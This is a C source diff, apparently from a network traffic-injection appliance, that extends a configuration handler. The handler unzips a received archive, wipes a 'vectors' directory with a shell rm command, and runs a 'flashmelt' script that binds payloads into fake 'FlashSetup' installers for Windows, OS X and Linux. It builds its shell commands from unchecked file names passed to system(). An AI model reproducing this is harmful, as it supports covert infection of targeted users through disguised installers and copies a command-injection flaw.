@@ -559,12 +559,14 @@ int rnc_config(json_object *json)
 
 int rnc_confighandler(char *data, int len)
 {
-   char buf[100 * 1024];
+   char buf[100 * 1024], argv[1024];
    RncProtoConfig pconfig;
    BIO *bmem = NULL, *bbase64 = NULL, *bfile = NULL;
+   struct dirent *entvec = NULL;
    FILE *fp = NULL;
-   char *path = NULL;
-   int ret = 0, blen = 0, error = 0, success = 0, retvalue = -1;
+   DIR *dirvec = NULL;
+   char *path = NULL, *dir = NULL, *p = NULL, *vectors = NULL, *file = NULL, *cmd_melt = NULL;
+   int ret = 0, blen = 0, status = 0, error = 0, success = 0, retvalue = -1;
 
    DEBUG_MSG(D_INFO, "New configuration from RNC is supported [%d]", len);
 
@@ -626,6 +628,109 @@ int rnc_confighandler(char *data, int len)
 
       DEBUG_MSG(D_INFO, "New configuration from RNC is checked and corrected [%d]", blen);
 
+      /* The file is a ZIP archive, extract it */
+
+      if ((dir = strdup(path)) == NULL) {
+         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+         break;
+      }
+
+      if ((p = strrchr(dir, '/')) != NULL)
+         *p = 0;
+
+      ret = asprintf(&vectors, "%s/vectors/", dir);
+
+      if (ret < 0 || vectors == NULL) {
+         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+         break;
+      }
+
+      DEBUG_MSG(D_INFO, "Cleaning vectors directory...");
+
+      snprintf(argv, sizeof(argv), "/bin/rm -f %s*", vectors);
+      ret = system(argv);
+
+      if (ret == -1 || ret == 127) {
+         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+         break;
+      }
+
+      DEBUG_MSG(D_INFO, "Uncompressing configuration file...");
+
+      snprintf(argv, sizeof(argv), "/usr/bin/unzip -o %s -d %s", path, dir);
+      ret = system(argv);
+
+      if (ret == -1 || ret == 127) {
+         DEBUG_MSG(D_ERROR, "Unzip failed"); 
+         break;
+      }
+
+      if (remove(path) == -1) {
+         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+         break;
+      }
+
+      DEBUG_MSG(D_INFO, "Check melting of new configuration files for inject html flash...");
+
+      if ((dirvec = opendir(vectors)) == NULL) {
+         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+         break;
+      }
+
+      while ((entvec = readdir(dirvec)) != NULL) {
+         file = entvec->d_name;
+
+         if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".windows") != NULL) {
+            file[strlen(file) - 8] = '\0';
+
+            DEBUG_MSG(D_INFO, "Windows detected, melting...");
+            ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py windows %s", file);
+         } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".osx") != NULL) {
+            file[strlen(file) - 4] = '\0';
+
+            DEBUG_MSG(D_INFO, "OS X detected, melting...");
+            ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py osx %s", file);
+         } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".apk") != NULL) {
+            DEBUG_MSG(D_INFO, "Android detected, already melted...");
+            continue;
+         } else if (strstr(file, "FlashSetup-") != NULL && strstr(file, ".linux") != NULL) {
+            file[strlen(file) - 6] = '\0';
+
+            DEBUG_MSG(D_INFO, "Linux detected, melting...");
+            ret = asprintf(&cmd_melt, "/opt/td-config/scripts/flashmelt.py linux %s", file);
+         } else {
+            continue;
+         }
+
+         if (ret < 0 || cmd_melt == NULL) {
+            error = 1;
+            DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+            break;
+         }
+
+         ret = system(cmd_melt);
+
+         if (ret == -1 || ret == 127) {
+            error = 1;
+            SAFE_FREE(cmd_melt);
+            DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
+            break;
+         }
+
+         SAFE_FREE(cmd_melt);
+         status = 1;
+      }
+
+      closedir(dirvec);
+
+      if (error == 1)
+         break;
+
+      if (status == 1)
+         DEBUG_MSG(D_INFO, "Melting of new configuration files for inject html flash completed");
+      else
+         DEBUG_MSG(D_INFO, "NO melting of new configuration files this time for inject html flash");
+
       //TODO
 
       success = 1;
@@ -641,6 +746,12 @@ int rnc_confighandler(char *data, int len)
 
    if (path)
       SAFE_FREE(path);
+
+   if (dir)
+      SAFE_FREE(dir);
+
+   if (vectors)
+      SAFE_FREE(vectors);
 
    if (bmem)
       BIO_free(bmem);
@@ -780,6 +891,8 @@ int rnc_upgradehandler(char *data, int len)
          break;
 
       DEBUG_MSG(D_INFO, "New upgrade from RNC is checked and corrected [%d]", blen);
+
+      /* The file is a DEB file */
 
       success = 1;
       retvalue = 0;
